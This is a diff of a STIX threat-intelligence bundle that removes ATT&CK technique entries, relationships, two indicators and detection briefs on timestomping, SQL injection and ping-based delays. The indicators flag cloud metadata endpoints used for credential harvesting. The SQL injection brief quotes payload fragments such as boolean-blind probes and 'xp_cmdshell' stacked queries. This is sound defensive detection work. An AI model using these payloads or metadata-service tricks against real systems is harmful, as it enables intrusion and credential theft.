@@ -1,6 +1,6 @@
 {
   "type": "bundle",
-  "id": "bundle--40c0c123-d9fa-5a18-9c5a-c1c408d0beb6",
+  "id": "bundle--cb93d093-d889-5a43-a7c9-d27efe84123b",
   "objects": [
     {
       "type": "attack-pattern",
@@ -1029,38 +1029,6 @@
     {
       "type": "attack-pattern",
       "spec_version": "2.1",
-      "id": "attack-pattern--bcb7aac1-0720-51b7-a9c7-65d3bf929d34",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2025-01-01T00:00:00.000Z",
-      "modified": "2025-01-01T00:00:00.000Z",
-      "name": "Service Stop",
-      "external_references": [
-        {
-          "source_name": "mitre-attack",
-          "external_id": "T1489",
-          "url": "https://attack.mitre.org/techniques/T1489"
-        }
-      ]
-    },
-    {
-      "type": "attack-pattern",
-      "spec_version": "2.1",
-      "id": "attack-pattern--bd875342-0c00-5eaf-9fc6-290ea891ae27",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2025-01-01T00:00:00.000Z",
-      "modified": "2025-01-01T00:00:00.000Z",
-      "name": "Container Administration Command",
-      "external_references": [
-        {
-          "source_name": "mitre-attack",
-          "external_id": "T1609",
-          "url": "https://attack.mitre.org/techniques/T1609"
-        }
-      ]
-    },
-    {
-      "type": "attack-pattern",
-      "spec_version": "2.1",
       "id": "attack-pattern--bea84da1-fe85-5fa2-a60d-90c3c86b9473",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -1365,22 +1333,6 @@
     {
       "type": "attack-pattern",
       "spec_version": "2.1",
-      "id": "attack-pattern--fc019f54-19d6-522e-badf-e97531e4978f",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2025-01-01T00:00:00.000Z",
-      "modified": "2025-01-01T00:00:00.000Z",
-      "name": "Virtualization/Sandbox Evasion",
-      "external_references": [
-        {
-          "source_name": "mitre-attack",
-          "external_id": "T1497",
-          "url": "https://attack.mitre.org/techniques/T1497"
-        }
-      ]
-    },
-    {
-      "type": "attack-pattern",
-      "spec_version": "2.1",
       "id": "attack-pattern--fe1e140b-0e35-5f0d-a990-f0c9146cacb3",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -1402,19 +1354,6 @@
       "modified": "2025-01-01T00:00:00.000Z",
       "name": "CraftedSignal",
       "identity_class": "organization"
-    },
-    {
-      "type": "indicator",
-      "spec_version": "2.1",
-      "id": "indicator--01f95490-ba46-5442-9779-26edd8899617",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:03.000Z",
-      "modified": "2026-08-24T15:47:03.000Z",
-      "name": "domain: metadata.google.internal",
-      "description": "GCP instance metadata service hostname used for reconnaissance.",
-      "pattern": "[domain-name:value = 'metadata.google.internal']",
-      "pattern_type": "stix",
-      "valid_from": "2026-08-24T15:47:03.000Z"
     },
     {
       "type": "indicator",
@@ -1532,19 +1471,6 @@
       "pattern": "[domain-name:value = 'systemsupportoperations.onmicrosoft.com']",
       "pattern_type": "stix",
       "valid_from": "2026-08-31T11:54:52.000Z"
-    },
-    {
-      "type": "indicator",
-      "spec_version": "2.1",
-      "id": "indicator--9d1eb90a-7157-5602-8b33-fd52411f02b8",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:03.000Z",
-      "modified": "2026-08-24T15:47:03.000Z",
-      "name": "ip: 169.254.169.254",
-      "description": "Cloud instance metadata service link-local address used for credential harvesting.",
-      "pattern": "[ipv4-addr:value = '169.254.169.254']",
-      "pattern_type": "stix",
-      "valid_from": "2026-08-24T15:47:03.000Z"
     },
     {
       "type": "indicator",
@@ -5113,17 +5039,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--44b37747-b25e-5033-bbfc-2711c5c6dec6",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:03.000Z",
-      "modified": "2026-08-24T15:47:03.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--b9ff0822-1f28-5c3f-b386-0d53c835e85c",
-      "target_ref": "attack-pattern--bd875342-0c00-5eaf-9fc6-290ea891ae27"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--44ddba3c-bc65-59b8-b773-b3ac5c3ba67b",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-26T16:22:17.000Z",
@@ -5274,17 +5189,6 @@
       "relationship_type": "has",
       "source_ref": "software--7b1d8107-b14a-5bd5-8aab-ac3a997196b4",
       "target_ref": "vulnerability--df78c0b3-50b4-50ec-8b7b-3d9755c45e53"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--4801d5f0-2c48-5178-a9ef-5ce3de9994d0",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:03.000Z",
-      "modified": "2026-08-24T15:47:03.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--b9ff0822-1f28-5c3f-b386-0d53c835e85c",
-      "target_ref": "attack-pattern--dc5e4f03-1094-5965-8de6-b9af854b1653"
     },
     {
       "type": "relationship",
@@ -5795,17 +5699,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--576c869e-ccf5-50a4-b18a-e74cabc72417",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:48:11.000Z",
-      "modified": "2026-08-24T15:48:11.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--1fc5170e-9f7b-5539-afb8-6cb496a4eaf6",
-      "target_ref": "attack-pattern--2e4d9280-53f9-5f98-9c79-9970f1080b3d"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--57c69f5b-ae7e-5bea-b6af-4fdf08002d01",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -6011,17 +5904,6 @@
       "relationship_type": "has",
       "source_ref": "software--5bbb17ba-8a0f-54fb-9fa1-ec9d53bc6cd0",
       "target_ref": "vulnerability--176e4d40-bf60-5b0a-8f65-b230805fa038"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--5ca1ac77-95be-5b4f-ad54-47ea66bac7c4",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:48:23.000Z",
-      "modified": "2026-08-24T15:48:23.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--534dae19-3c1c-56ab-bd62-5add9b9d27d5",
-      "target_ref": "attack-pattern--633c0a79-a71b-5eb7-9eca-504796091337"
     },
     {
       "type": "relationship",
@@ -6385,17 +6267,6 @@
       "relationship_type": "uses",
       "source_ref": "report--c21871ca-b395-585c-bbd0-810ed40c88de",
       "target_ref": "attack-pattern--2e4d9280-53f9-5f98-9c79-9970f1080b3d"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--6155ae8f-cab4-5bd0-9801-cdf0db3b89bc",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:46:26.000Z",
-      "modified": "2026-10-09T12:11:48.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--40b168ee-c734-5f5d-ba42-5947c0cf8e4a",
-      "target_ref": "attack-pattern--fc019f54-19d6-522e-badf-e97531e4978f"
     },
     {
       "type": "relationship",
@@ -7489,28 +7360,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--761bc97f-6db1-508b-b5e6-1f947f45ec60",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:12.000Z",
-      "modified": "2026-08-24T15:47:12.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--c0e8142c-9502-579a-8002-af44b0691d96",
-      "target_ref": "attack-pattern--bd875342-0c00-5eaf-9fc6-290ea891ae27"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--761f8057-c513-521c-a065-bf993e2cc3a5",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:46:53.000Z",
-      "modified": "2026-08-24T15:46:53.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--9106dc60-7c28-5e94-90e4-42d533a33cb7",
-      "target_ref": "attack-pattern--6ef3c5ca-94f5-57f2-924a-8c2f91b71d40"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--762d918f-26e4-5f54-b0e0-41c57b1236cc",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-31T12:55:01.000Z",
@@ -7606,17 +7455,6 @@
       "relationship_type": "uses",
       "source_ref": "report--6e8e08bc-b226-53df-9bd5-5ea47c6ff487",
       "target_ref": "attack-pattern--03c83a54-7fcd-5e1a-99d5-88d0bbd8fb19"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--7749dbcb-da52-55d1-9167-80a320a50bf6",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:03.000Z",
-      "modified": "2026-08-24T15:47:03.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--b9ff0822-1f28-5c3f-b386-0d53c835e85c",
-      "target_ref": "indicator--9d1eb90a-7157-5602-8b33-fd52411f02b8"
     },
     {
       "type": "relationship",
@@ -7951,17 +7789,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--7dd7d314-70d5-5cbe-8996-55090384ce8e",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:40.000Z",
-      "modified": "2026-08-24T15:47:40.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--471f132a-4ec9-5ed2-b078-0675955bb356",
-      "target_ref": "attack-pattern--942c509a-a6cb-5ec1-bdbc-488dbadf021d"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--7e20b6a9-cbf8-5117-9cad-9b541edfa67f",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -8050,17 +7877,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--7f913887-64f6-52bb-9ed8-49587ea29c6b",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:32.000Z",
-      "modified": "2026-08-24T15:47:32.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--60be7a56-8c94-5f5d-b036-b894b8c5c79e",
-      "target_ref": "attack-pattern--dc5e4f03-1094-5965-8de6-b9af854b1653"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--7fd18141-ee74-5948-8e54-1cdf0ad77519",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-28T21:19:10.000Z",
@@ -8101,17 +7917,6 @@
       "relationship_type": "has",
       "source_ref": "software--e2a3f0d7-6d8e-5950-9ee1-fe056fa63381",
       "target_ref": "vulnerability--94995a02-030e-5294-a6dd-bfdd763fc400"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--8102368f-edb9-51b8-a236-b9260d29e820",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:40.000Z",
-      "modified": "2026-08-24T15:47:40.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--471f132a-4ec9-5ed2-b078-0675955bb356",
-      "target_ref": "attack-pattern--bd875342-0c00-5eaf-9fc6-290ea891ae27"
     },
     {
       "type": "relationship",
@@ -8365,17 +8170,6 @@
       "relationship_type": "has",
       "source_ref": "software--0688b3ae-912d-5f17-a4cd-7b117e4736cb",
       "target_ref": "vulnerability--7482b26f-b6df-5528-a416-a16f5fe7f08d"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--86c47f48-2a0b-5c78-8d26-b233075485eb",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:48:11.000Z",
-      "modified": "2026-08-24T15:48:11.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--1fc5170e-9f7b-5539-afb8-6cb496a4eaf6",
-      "target_ref": "attack-pattern--26ef37e6-18b0-51e5-b888-57037be44a7c"
     },
     {
       "type": "relationship",
@@ -10525,17 +10319,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--b821f2f5-179e-537e-b856-fe99362c440e",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:03.000Z",
-      "modified": "2026-08-24T15:47:03.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--b9ff0822-1f28-5c3f-b386-0d53c835e85c",
-      "target_ref": "indicator--01f95490-ba46-5442-9779-26edd8899617"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--b84eb4f0-1814-57ba-aa4a-b8642f023958",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-28T14:28:32.000Z",
@@ -10543,17 +10326,6 @@
       "relationship_type": "uses",
       "source_ref": "report--c20fff9c-3341-582c-a47f-5ed42e10db3c",
       "target_ref": "indicator--eb430418-9631-57a0-8194-775b35aae13a"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--b8c141bc-9c37-5025-ba35-a49929201907",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:12.000Z",
-      "modified": "2026-08-24T15:47:12.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--c0e8142c-9502-579a-8002-af44b0691d96",
-      "target_ref": "attack-pattern--dc5e4f03-1094-5965-8de6-b9af854b1653"
     },
     {
       "type": "relationship",
@@ -11317,17 +11089,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--c808b5d8-6b58-5586-8a11-a98fc9f63bc3",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:49.000Z",
-      "modified": "2026-08-24T15:47:49.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--ef1aaeac-0353-5301-aca8-cbd48c568184",
-      "target_ref": "attack-pattern--bd875342-0c00-5eaf-9fc6-290ea891ae27"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--c82dc259-7153-568b-9f2c-9201863d3b4c",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2025-01-01T00:00:00.000Z",
@@ -11537,17 +11298,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--cc3bcadb-af33-56cb-8b06-4ec08365fc13",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:48:00.000Z",
-      "modified": "2026-08-24T15:48:00.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--18e07c38-e6b0-5f5f-97ec-a1e6431b3192",
-      "target_ref": "attack-pattern--0856bd82-6dcb-584e-bbac-9f484aa79d34"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--cc59aa6d-99fe-5b53-83cd-842fe451ecca",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-26T14:07:47.000Z",
@@ -11654,17 +11404,6 @@
       "relationship_type": "uses",
       "source_ref": "report--edc5ad21-128c-588d-9d16-c1261000c3ac",
       "target_ref": "attack-pattern--745c9492-77e4-5572-9132-308959464536"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--ce29446d-cecd-5ab9-bde5-2cb8631ba466",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:48:23.000Z",
-      "modified": "2026-08-24T15:48:23.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--534dae19-3c1c-56ab-bd62-5add9b9d27d5",
-      "target_ref": "attack-pattern--b2ef40df-6911-5059-85e1-8e863224f8cd"
     },
     {
       "type": "relationship",
@@ -12846,17 +12585,6 @@
     {
       "type": "relationship",
       "spec_version": "2.1",
-      "id": "relationship--ea08f0a8-8e33-5d9c-8a58-8cc0af565445",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:46:08.000Z",
-      "modified": "2026-08-24T15:46:08.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--ab6ca67f-2bb1-52e8-9850-cca4bb7485e6",
-      "target_ref": "attack-pattern--1c2f2ef4-96d1-5f02-86f0-bf0721251ef2"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
       "id": "relationship--ea305ed9-e060-549f-bc5b-46ea12f4542e",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-28T21:06:42.000Z",
@@ -12919,17 +12647,6 @@
       "relationship_type": "uses",
       "source_ref": "report--28930ae2-17d9-58e1-8fc5-8fa8d48109d1",
       "target_ref": "attack-pattern--3fc83c04-d94a-5ca3-9a9d-a73dbc36e527"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--eacde561-df65-57b4-b708-5e5973233193",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:46:45.000Z",
-      "modified": "2026-08-24T15:46:45.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--de98bf40-44ca-5389-b1db-9fe277f2f62c",
-      "target_ref": "attack-pattern--bcb7aac1-0720-51b7-a9c7-65d3bf929d34"
     },
     {
       "type": "relationship",
@@ -13260,17 +12977,6 @@
       "relationship_type": "uses",
       "source_ref": "report--c04c7da1-357a-5c64-96be-21424c0161f7",
       "target_ref": "attack-pattern--65c46ec0-1d8a-5475-ac40-da65faef6306"
-    },
-    {
-      "type": "relationship",
-      "spec_version": "2.1",
-      "id": "relationship--f105d35d-111e-50b6-a8ba-a59214bec0b5",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:47:49.000Z",
-      "modified": "2026-08-24T15:47:49.000Z",
-      "relationship_type": "uses",
-      "source_ref": "report--ef1aaeac-0353-5301-aca8-cbd48c568184",
-      "target_ref": "attack-pattern--e6e63efe-42b5-57bd-b4b7-a8415ab979eb"
     },
     {
       "type": "relationship",
@@ -15538,45 +15244,6 @@
     {
       "type": "report",
       "spec_version": "2.1",
-      "id": "report--18e07c38-e6b0-5f5f-97ec-a1e6431b3192",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:48:00.000Z",
-      "modified": "2026-08-24T15:48:00.000Z",
-      "name": "Detection of Timestomping on Windows Executables",
-      "description": "## Overview\n\nAdversaries frequently employ timestomping to manipulate the metadata of malicious files, allowing them to blend in with legitimate system files or appear older than they are, thereby evading signature-based or heuristic detection systems. This technique involves modifying the creation, access, or modification timestamps of files. \n\nDefenders should focus on monitoring the modification of creation timestamps for executable files (such as .exe, .dll, .sys, .msi, .scr, .pif, and .lnk) within sensitive Windows directories, including `C:\\Windows\\System32`, `C:\\ProgramData`, and user-specific startup folders. The detection logic provided identifies suspicious file creation time changes initiated by non-system processes, effectively distinguishing malicious activity from routine system operations or enterprise maintenance tasks that update binary metadata.\n\n## Attack Chain\n\n1. Attacker gains initial access or establishes persistence on the target Windows system.\n2. Attacker downloads or stages a malicious executable or shortcut (.lnk) file.\n3. Attacker executes a timestomping utility or utilizes Windows API calls (such as SetFileTime) to modify the file's creation timestamp.\n4. The operating system updates the file metadata, triggering a Sysmon Event ID 2.\n5. The attacker places or moves the modified file into a sensitive system or startup directory (e.g., `C:\\Windows\\System32` or `AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`).\n6. The modified file masquerades as a legitimate system binary or older, trusted file, bypassing simple temporal-based detection methods.\n7. The attacker triggers the execution of the malicious file to maintain persistence or conduct further lateral movement.\n\n## Impact\n\nSuccessful timestomping undermines forensic timelines, makes malicious files appear benign, and assists in the long-term persistence of threats on a system. If undetected, attackers can maintain a foothold in the environment, facilitating ongoing data exfiltration, lateral movement, or ransomware deployment.\n\n## Recommendation\n\n1. Enable Sysmon Event ID 2 (File Creation Time Change) logging across all endpoints to capture the necessary telemetry.\n2. Deploy the provided Sigma rule to your SIEM to monitor for unauthorized modifications to creation timestamps in sensitive directories.\n3. Establish a baseline for automated administrative and update processes to tune the rule and minimize false positives.\n4. Investigate any alerts generated for files located in startup directories as high-priority, as these are often indicators of persistence mechanisms.\n",
-      "published": "2026-08-24T15:48:00.000Z",
-      "labels": [
-        "defense-evasion",
-        "sysmon",
-        "windows"
-      ],
-      "object_refs": [
-        "attack-pattern--0856bd82-6dcb-584e-bbac-9f484aa79d34",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-timestomp-detection",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-timestomp-detection/"
-        }
-      ],
-      "confidence": 60,
-      "x_craftedsignal_brief_id": "brief-2026-08-timestomp-detection",
-      "x_craftedsignal_event_id": "brief-2026-08-timestomp-detection",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-timestomp-detection/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:48:00.000Z",
-      "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
       "id": "report--1980c8f0-6cbb-5ebc-b007-b8b17a992fa0",
       "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
       "created": "2026-08-28T00:20:53.000Z",
@@ -15898,47 +15565,6 @@
       "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-guardduty-intel-deletion/",
       "x_craftedsignal_activity_at": "2026-08-26T13:54:53.000Z",
       "x_craftedsignal_severity": "medium",
-      "x_craftedsignal_type": "advisory",
-      "x_craftedsignal_exploitation_evidence": {
-        "status": "unknown"
-      },
-      "x_craftedsignal_kev_status": "unknown"
-    },
-    {
-      "type": "report",
-      "spec_version": "2.1",
-      "id": "report--1fc5170e-9f7b-5539-afb8-6cb496a4eaf6",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:48:11.000Z",
-      "modified": "2026-08-24T15:48:11.000Z",
-      "name": "Detection of Automated SQL Injection Patterns in Web Server Traffic",
-      "description": "## Overview\n\nThis threat brief focuses on the persistent exploitation of public-facing web applications via SQL injection (SQLi). Attackers frequently employ automated tools, such as sqlmap, to discover and exploit backend database vulnerabilities through unsanitized web request parameters. The patterns observed span multiple SQL dialects, including MySQL, MSSQL, PostgreSQL, and Oracle. These attacks aim to achieve diverse objectives, ranging from sensitive data exfiltration through UNION-based or error-based techniques to gaining full operating system command execution via stacked queries (e.g., `xp_cmdshell`). Because these attacks rely on structural SQL patterns in HTTP traffic, defenders can identify them by analyzing web server access logs for specific malicious syntax that deviates from standard application traffic.\n\n## Attack Chain\n\n1. Attacker performs reconnaissance by scanning web endpoints for common parameter injection points.\n2. Attacker probes backend database structure using boolean-blind techniques (e.g., `AND 1=1--`).\n3. Attacker attempts to confirm vulnerability and extract data using UNION-based injection payloads.\n4. Attacker forces database errors to leak internal schema metadata (e.g., `extractvalue`, `updatexml`).\n5. Attacker executes time-based blind SQLi (e.g., `pg_sleep`, `benchmark`) to confirm vulnerability through application latency.\n6. Attacker attempts to escalate privileges or gain shell access using stacked queries (e.g., `;exec xp_cmdshell`).\n7. Attacker retrieves sensitive data or interacts with the underlying OS.\n\n## Impact\n\nSuccessful SQL injection leads to unauthorized access to backend databases, potential exfiltration of sensitive organizational data, and in scenarios involving stacked queries, the compromise of the web server host itself. The breadth of targeting is indiscriminate, affecting any web-facing application that fails to utilize parameterized queries or prepared statements.\n\n## Recommendation\n\nPrioritize the implementation of the provided Sigma rule across all public-facing web infrastructure.\n\n* Deploy the following Sigma rule to monitor for structural SQLi patterns in web server access logs.\n* Filter existing security scanning traffic by identifying and allowlisting authorized vulnerability scanner IP addresses and user agents.\n* Ensure that all application code interacting with databases is updated to use prepared statements and parameterized queries.\n* Enforce the principle of least privilege on database accounts used by web applications to prevent execution of administrative procedures like `xp_cmdshell`.\n* Correlate matches from the detection rule with 500-series HTTP response codes, which may indicate error-based data leakage.\n",
-      "published": "2026-08-24T15:48:11.000Z",
-      "object_refs": [
-        "attack-pattern--26ef37e6-18b0-51e5-b888-57037be44a7c",
-        "attack-pattern--2e4d9280-53f9-5f98-9c79-9970f1080b3d",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-        "software--0cacc068-9bc4-5c3f-8369-fce9ee1c1593",
-        "software--321aea8e-61a5-5f48-9647-32e3772dee58",
-        "software--54780e80-06d8-5262-9407-cc232a75a07f",
-        "software--6f49ad8d-6cd3-5a0a-96a6-3fccea667096",
-        "software--92d0dbed-61d9-5af0-bb63-dbd0104c8afa",
-        "software--a1521327-ec2c-5d93-894b-4efdbd58fc92"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-web-server-sqli",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-web-server-sqli/"
-        }
-      ],
-      "confidence": 80,
-      "x_craftedsignal_brief_id": "brief-2026-08-web-server-sqli",
-      "x_craftedsignal_event_id": "brief-2026-08-web-server-sqli",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-web-server-sqli/",
-      "x_craftedsignal_activity_at": "2026-08-24T15:48:11.000Z",
-      "x_craftedsignal_severity": "high",
       "x_craftedsignal_type": "advisory",
       "x_craftedsignal_exploitation_evidence": {
         "status": "unknown"
@@ -18248,49 +17874,6 @@
     {
       "type": "report",
       "spec_version": "2.1",
-      "id": "report--40b168ee-c734-5f5d-ba42-5947c0cf8e4a",
-      "created_by_ref": "identity--08adab07-f58c-527d-9c31-5fab939b0d7f",
-      "created": "2026-08-24T15:46:26.000Z",
-      "modified": "2026-10-09T12:11:48.000Z",
-      "name": "Detection of Ping-Based Execution Delays in Batch Scripts",
-      "description": "## Overview\n\nAdversaries often use the standard Windows 'ping' utility as an improvised delay mechanism to introduce pauses in command-line execution sequences. By leveraging the '-n' (count) flag, attackers can force a delay proportional to the number of ICMP echo requests sent, effectively creating a 'sleep' command without relying on standard system utilities that might be more heavily monitored. This technique is frequently employed during the initial staging or persistence phases of an attack to evade automated sandbox analysis, dynamic analysis, or behavior-based detection logic.\n\nThreat actors chain these ping-based delays with subsequent malicious commands using Windows batch command separators such as '\u0026', '||', or redirection operators ('\u003e'). This methodology has been observed in various campaigns, including those involving data destruction malware like WhisperGate, as well as multiple Remote Access Trojans (RATs) and ransomware families. Defenders must analyze the full command-line context, parent process, and user activity to differentiate this malicious usage from legitimate network troubleshooting or administrative scripting.\n\n## Impact\n\nSuccessful implementation of this technique allows adversaries to bypass time-limited sandbox environments, increasing the likelihood that malicious payloads will execute successfully on target hosts. This pattern has been associated with destructive malware, ransomware, and information-stealing campaigns, where undetected execution can lead to full system compromise, data encryption, or credential theft.\n\n## Recommendation\n\n- Implement EDR process-creation telemetry monitoring for ping.exe command lines that include both count flags and command separators.\n- Deploy the provided Sigma rule to identify suspicious command chaining patterns at the endpoint level.\n- Establish a baseline of legitimate administrative scripts using ping for network testing to minimize false positives during tuning.\n- Prioritize investigation of alerts where ping-based delays precede suspicious activities like credential dumping, lateral movement tools, or file system modifications.\n",
-      "published": "2026-08-24T15:46:26.000Z",
-      "labels": [
-        "batch-scripting",
-        "defense-evasion",
-        "sandbox-evasion"
-      ],
-      "object_refs": [
-        "attack-pattern--fc019f54-19d6-522e-badf-e97531e4978f",
-        "identity--08adab07-f58c-527d-9c31-5fab939b0d7f"
-      ],
-      "external_references": [
-        {
-          "source_name": "craftedsignal",
-          "external_id": "brief-2026-08-ping-sleep-batch",
-          "url": "https://feed.craftedsignal.io/briefs/2026-08-ping-sleep-batch/"
-        },
-        {
-          "source_name": "reference",
-          "url": "https://github.com/splunk/security_content/blob/main/detections/endpoint/ping_sleep_batch_command.yml"
-        }
-      ],
-      "confidence": 60,
-      "x_craftedsignal_brief_id": "brief-2026-08-ping-sleep-batch",
-      "x_craftedsignal_event_id": "brief-2026-08-ping-sleep-batch",
-      "x_craftedsignal_revision": 1,
-      "x_craftedsignal_canonical_url": "https://feed.craftedsignal.io/briefs/2026-08-ping-sleep-batch/",
-      "x_craftedsignal_activity_at": "2026-10-09T12:11:48.000Z",
-      "x_craftedsignal_severity": "medium",
